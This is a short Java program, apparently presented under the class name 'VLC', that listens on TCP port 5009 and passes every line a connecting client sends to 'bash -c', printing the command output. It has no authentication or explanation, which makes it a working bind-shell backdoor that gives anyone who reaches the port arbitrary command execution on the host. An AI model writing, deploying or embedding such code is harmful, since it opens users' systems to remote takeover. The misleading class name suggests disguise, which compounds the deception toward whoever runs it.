import java.net.*;
import java.io.*;
public class VLC{
    public static void main(String a[]) throws Exception{
        ServerSocket ss=new ServerSocket(5009);
        System.out.println("Connection successful");
        System.out.println("Waiting for Client message");
        Socket s=ss.accept();
        DataInputStream din=new DataInputStream(s.getInputStream());  
         String line="";
          while (!line.equals("Over")) {
                    line = din.readUTF();
                    Process process = new ProcessBuilder("bash", "-c", line).start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String result;
                    while ((result = reader.readLine()) != null) {
                        System.out.println(result);
                    }
            }
    }
}